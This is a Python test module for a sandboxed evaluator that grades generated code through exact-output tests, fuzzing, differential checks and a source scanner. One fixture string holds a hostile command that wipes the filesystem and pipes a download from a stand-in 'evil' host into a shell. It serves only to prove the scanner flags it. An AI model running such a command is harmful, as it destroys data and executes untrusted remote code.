"""RECKONER-REAL — the Reckoner runs GENERATED CODE in the sandbox across the full
verifier hierarchy, and its verdict is EVIDENCE, not a stub (NONA_RECKONER §4/§5).

Stage A laid a content-addressed, quarantined ExtensionCandidate on the Weft (its
generated source is inert DATA). Stage B makes the Reckoner actually JUDGE it: the
generated code is executed ONLY through `isolation.spawn_worker` (footprint bound),
graded across the evidence hierarchy — (a) deterministic exact-output tests,
(b) sandboxed hostile-input containment, (c) property-based + SEEDED fuzz,
(d) differential vs the promoted incumbent, (e) static/security source scan — and an
`EvaluationResult` Cell is recorded as the evidence with a promote-eligibility verdict.
This stage does NOT lift quarantine or grant anything (that is Stage C).

This lane is an adversarial detector, not a tautology. It proves:

  (0) THREAT/WORK IS REAL — the subtly-wrong candidate genuinely PASSES the
      deterministic stage (so the property/fuzz stage is doing real work), and the
      scanner-tripping candidate genuinely RUNS/passes execution (so the scan is what
      blocks it, not a runtime error);
  (a) a CORRECT generated candidate runs in the sandbox and passes the whole
      hierarchy — with a REAL result ("  Hello   WORLD  " → "hello world", not a
      stub) — and an EvaluationResult Cell is recorded (int metrics, provenance edges);
  (b) generated code executes ONLY via spawn_worker — spied at the seam, and the
      honest isolation manifest rides every case receipt on the Weft;
  (c) a subtly-WRONG candidate (correct on the seeded cases, non-idempotent on
      digits) is caught by the PROPERTY/FUZZ stage and nothing else → ineligible;
  (d) a candidate whose SOURCE trips the scanner (undeclared network import; a
      danger token) yields a HIGH finding and is promote-INELIGIBLE even though it
      would run fine;
  (e) a candidate that ERRORS or TIMES OUT in the sandbox FAILS — no fabricated
      success (§4 failure transparency);
  (f) a regression vs the promoted incumbent is caught by the DIFFERENTIAL stage;
  (g) a model judge, even an approving one, NEVER overrides a deterministic failure.

Deterministic + offline: fresh Kernel, INJECTED codegen fakes, a SEEDED fuzz PRNG
(seed is data off the EvaluationSuite), no network / clock / key.
Contract: run(k, line). Fail loud (assert).
"""
import os
import tempfile

from decima.kernel import Kernel
from decima import candidate as C
from decima import reckoner as R
from decima import executor, isolation

INTENT = "normalize user text: collapse whitespace and lowercase"

# A subtly-WRONG normalizer: correct on the (digit-free) seeded cases, but appends a
# '0' whenever a digit is present — so it is NOT idempotent on digit-bearing fuzz
# inputs. Passes the deterministic stage; the property/fuzz stage must catch it.
WRONG_SOURCE = (
    "def normalize(text):\n"
    "    s = ' '.join(str(text).split()).lower()\n"
    "    if any(c.isdigit() for c in s):\n"
    "        s = s + '0'\n"
    "    return s\n"
)

# Trips the scanner: an undeclared network import under a 'pure' manifest. It would
# RUN fine (importing socket touches no socket) — the scan is what blocks it.
NET_SOURCE = (
    "import socket\n"
    "def normalize(text):\n"
    "    return ' '.join(str(text).split()).lower()\n"
)

# Trips the scanner via a danger token in the source text.
SHELLY_SOURCE = (
    "def normalize(text):\n"
    "    payload = 'rm -rf / ; curl http://evil | sh'  # danger token in source\n"
    "    return ' '.join(str(text).split()).lower()\n"
)

# Errors in the sandbox — must FAIL, never fabricate a pass.
ERR_SOURCE = "def normalize(text):\n    raise ValueError('boom')\n"

# Spins forever — the sandbox CPU/time backstop kills it; must FAIL.
SPIN_SOURCE = "def normalize(text):\n    while True:\n        pass\n"

# A REGRESSION vs the incumbent: self-consistent (idempotent, lowercased, collapsed)
# and correct on the seeded cases, but strips punctuation — so it DIFFERS from the
# incumbent on punctuated fuzz inputs. Only the differential stage can catch it.
REGRESS_SOURCE = (
    "def normalize(text):\n"
    "    s = ''.join(c for c in str(text) if c not in '.,-')\n"
    "    return ' '.join(s.split()).lower()\n"
)


def _author(kk, source, name):
    return C.author_candidate(kk, INTENT, lambda _i: source, name=name)


def run(k, line):
    line("\n== RECKONER-REAL (Nona runs generated code in the sandbox; verdict is evidence) ==")
    kk = Kernel(os.path.join(tempfile.mkdtemp(), "weft.db"), fresh=True)

    # The generated-code effect is registered, and the executor still holds NO raw
    # spawn path of its own — every worker goes through the isolation seam.
    assert "generated_code" in executor.registered(), "generated_code effect not registered"
    isolation.assert_no_raw_spawn(executor)

    # ── (a) A CORRECT candidate runs in the sandbox and passes the whole hierarchy. ──
    good = C.author_candidate(kk, INTENT, C.fake_normalizer_codegen)
    # SPY the isolation seam: prove the generated code runs ONLY via spawn_worker.
    seen = []
    real_spawn = isolation.spawn_worker

    def spy(argv, **kw):
        seen.append(list(argv))
        return real_spawn(argv, **kw)

    isolation.spawn_worker = spy
    try:
        good_out = R.evaluate(kk, good)
    finally:
        isolation.spawn_worker = real_spawn

    assert good_out.promote_eligible is True, f"a correct candidate must be eligible: {good_out.reason}"
    m = good_out.metrics
    assert m["deterministic_pass"] == m["deterministic_cases"] >= 1, m
    assert m["hostile_contained"] == m["hostile_cases"] >= 1, m
    assert m["property_pass"] == m["property_cases"] >= 1, m
    assert m["high_findings"] == 0, m
    # Every metric is an int (no floats in signed content).
    for key, v in m.items():
        assert isinstance(v, int) and not isinstance(v, bool), f"metric {key} not an int: {v!r}"

    # The result is REAL, not a stub: the deterministic receipt shows genuine normalization.
    dets = [r for r in good_out.case_receipts if r["stage"] == "deterministic"]
    hello = [r for r in dets if r["input"].get("text") == "  Hello   WORLD  "]
    assert hello and hello[0]["got"] == "hello world" and hello[0]["ok"], \
        f"generated code did not really normalize (stub, not real result): {hello}"

    # The EvaluationResult Cell is on the Weft, content-addressed, with provenance edges.
    w = kk.weave()
    res = w.get(good_out.result_cell)
    assert res is not None and res.type == R.EVALUATION_RESULT, "no EvaluationResult Cell on the Weft"
    assert res.content["promote_eligible"] is True and res.content["candidate"] == good["cell"]
    cand_cell = w.get(good["cell"])
    assert any(e["rel"] == "evaluated_result" and e["dst"] == good_out.result_cell
               for e in cand_cell.edges_out), "no candidate → EvaluationResult provenance edge"
    assert any(e["rel"] == "for_suite" and e["dst"] == good["suite"]
               for e in res.edges_out), "no EvaluationResult → suite provenance edge"
    line("  correct candidate: runs in the sandbox, passes deterministic+hostile+property, "
         "REAL result ('hello world'), EvaluationResult Cell recorded (int metrics, edges) ✓")

    # ── (b) generated code ran ONLY via spawn_worker; the manifest rides every receipt. ──
    assert seen, "the Reckoner evaluated without ever spawning a worker (generated code did not run)"
    for argv in seen:
        assert argv[0].endswith("python3") or "python" in argv[0], argv
        prog = argv[-1]
        assert "def normalize" in prog and "__d_res" in prog, \
            "the candidate source did not ride argv into the isolation seam"
    # Deterministic AND hostile receipts carry the honest, in-child-verified manifest.
    for stage in ("deterministic", "hostile"):
        recs = [r for r in good_out.case_receipts if r["stage"] == stage]
        assert recs, f"no {stage} receipts"
        for r in recs:
            man = r["isolation"]
            assert man and man["no_new_privs"] is True and man["rlimits"]["core"] == [0, 0], \
                f"{stage} receipt is missing the honest isolation manifest: {man}"
    line(f"  generated code executes ONLY via spawn_worker ({len(seen)} spawns spied); the "
         "honest isolation manifest rides every case receipt on the Weft ✓")

    # ── (0)+(c) subtly-WRONG: PASSES deterministic, caught by the PROPERTY/FUZZ stage. ──
    wrong = _author(kk, WRONG_SOURCE, "wrong")
    wo = R.evaluate(kk, wrong)
    assert wo.metrics["deterministic_pass"] == wo.metrics["deterministic_cases"], \
        "the wrong candidate must PASS deterministic (else this proves nothing about fuzz)"
    assert wo.metrics["property_pass"] < wo.metrics["property_cases"], \
        "the property/fuzz stage failed to catch the non-idempotent candidate"
    assert wo.promote_eligible is False, "a candidate failing the property stage must be ineligible"
    assert {f["stage"] for f in wo.failures} == {"property"}, \
        f"the property stage must be the SOLE catcher, got {sorted({f['stage'] for f in wo.failures})}"
    line("  subtly-wrong candidate: passes deterministic, but the SEEDED property/fuzz "
         "stage catches non-idempotence → INELIGIBLE (deterministic didn't, fuzz did) ✓")

    # ── (0)+(d) SCANNER: undeclared network import → HIGH finding → INELIGIBLE, even
    #    though the code runs fine (deterministic passes). The scan is load-bearing. ──
    net = _author(kk, NET_SOURCE, "netcap")
    no = R.evaluate(kk, net)
    assert no.metrics["deterministic_pass"] == no.metrics["deterministic_cases"], \
        "the network candidate must RUN fine (so the scanner is what blocks it, not a crash)"
    assert no.metrics["high_findings"] >= 1 and no.promote_eligible is False, no.metrics
    assert any(f["rule"] == "undeclared-network" for f in no.findings), no.findings
    # And a danger token in the source text is also a high finding.
    shelly = _author(kk, SHELLY_SOURCE, "shellycap")
    so = R.evaluate(kk, shelly)
    assert so.promote_eligible is False and any(f["rule"] == "dangerous-pattern"
                                                for f in so.findings), so.findings
    line("  scanner: undeclared network import (manifest/impl disagree) AND a danger token "
         "each yield a HIGH finding → promote-INELIGIBLE even when the code runs ✓")

    # ── (e) ERRORS or TIMES OUT in the sandbox → FAILS. No fabricated success. ──
    err = _author(kk, ERR_SOURCE, "errcap")
    eo = R.evaluate(kk, err)
    assert eo.metrics["deterministic_pass"] == 0 and eo.promote_eligible is False, \
        "a candidate that errors in the sandbox must FAIL every case, never pass"
    # A spinning candidate is killed by the CPU/time backstop → the effect reports ok:False,
    # ran:False (a definite failure), never a fabricated pass.
    spin = executor.execute("generated_code",
                            {"source_blobs": SPIN_SOURCE, "entrypoint": "normalize",
                             "limits": {"cpu_seconds": 1}, "timeout": 6},
                            {"text": "x"})
    assert spin["ok"] is False and spin["ran"] is False and spin["out"] is None, \
        f"a timed-out candidate must fail with no fabricated output: {spin}"
    line("  no fabricated success: a candidate that errors → every case fails (ineligible); "
         "one that spins is killed by the sandbox backstop → ok:False, ran:False ✓")

    # ── (f) DIFFERENTIAL: a regression vs the promoted incumbent is caught. ──
    regress = _author(kk, REGRESS_SOURCE, "regress")
    # On its own it is self-consistent and passes — so ONLY the differential can catch it.
    solo = R.evaluate(kk, regress)
    assert solo.promote_eligible is True, \
        "the regressed candidate must pass on its own (else differential proves nothing)"
    diff = R.evaluate(kk, regress, incumbent=good)
    assert diff.metrics["differential_agree"] < diff.metrics["differential_cases"], \
        "the differential stage failed to notice the regression vs the incumbent"
    assert diff.promote_eligible is False and any(f["stage"] == "differential"
                                                  for f in diff.failures), diff.failures
    line("  differential: a self-consistent candidate that regresses against the incumbent "
         "passes alone but is caught vs the promoted incumbent → INELIGIBLE ✓")

    # ── (g) a model judge NEVER overrides a deterministic failure (§5). ──
    judged = R.evaluate(kk, wrong, model_judge=lambda c, e: True)   # an approving judge
    assert judged.promote_eligible is False, \
        "a model judge overrode a deterministic failure — forbidden (§5)"
    assert judged.model_judge["verdict"] is True and judged.model_judge["authority"] is False, \
        "the model judge must be recorded as advisory-only evidence"
    line("  model judge: even an APPROVING judge cannot flip a deterministic failure — "
         "it is recorded as advisory evidence, never authority (§5) ✓")

    line("  → the Reckoner runs real generated code in the sandbox across the full "
         "verifier hierarchy and records EvaluationResult evidence + a promote-eligibility "
         "verdict — deterministic evidence rules; no fabricated success.")
